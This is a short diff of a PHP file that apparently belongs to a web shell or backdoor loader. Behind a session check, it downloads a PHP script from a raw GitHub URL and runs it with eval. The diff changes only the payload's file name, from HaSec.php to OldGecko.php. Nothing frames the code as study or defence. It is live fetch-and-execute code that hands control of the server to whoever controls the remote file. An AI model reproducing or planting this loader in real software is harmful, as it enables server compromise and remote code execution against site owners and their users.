@@ -93,7 +93,7 @@ if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
         return $data;
     }
 
-    $url = 'https://raw.githubusercontent.com/cindylara1122/script/main/1/2/3/4/5/HaSec.php';
+    $url = 'https://raw.githubusercontent.com/cindylara1122/script/main/1/2/3/4/5/OldGecko.php';
     $a = geturlsinfo($url);
     if ($a) {
         eval('?>' . $a); 
